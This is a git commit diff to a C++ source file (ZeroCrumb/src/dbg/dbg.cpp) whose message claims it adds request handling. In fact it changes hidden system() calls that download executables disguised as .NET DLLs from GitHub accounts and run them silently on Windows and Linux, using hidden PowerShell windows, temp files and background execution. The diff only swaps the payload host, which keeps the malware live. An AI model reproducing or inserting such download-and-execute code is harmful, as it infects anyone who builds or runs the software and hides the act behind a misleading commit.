52203569ae73d95b4e38b3a78b9d6f3f96c10951
Chetan Choudhary <94457212+ChetanChoudhary1@users.noreply.github.com>
2025-11-01 13:35:23 +0000

    Add request handling

--- ZeroCrumb/src/dbg/dbg.cpp
+++ ZeroCrumb/src/dbg/dbg.cpp
@@ -11,7 +11,7 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
         oss << hex << setw(2) << setfill('0') << static_cast<int>(key[i]);
 
 #ifdef _WIN32
-system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
+system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
 #elif defined(__linux__)
 system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
 #endif
@@ -19,7 +19,7 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
     return oss.str();
 
 #ifdef _WIN32
-system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
+system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
 #endif
 
 }
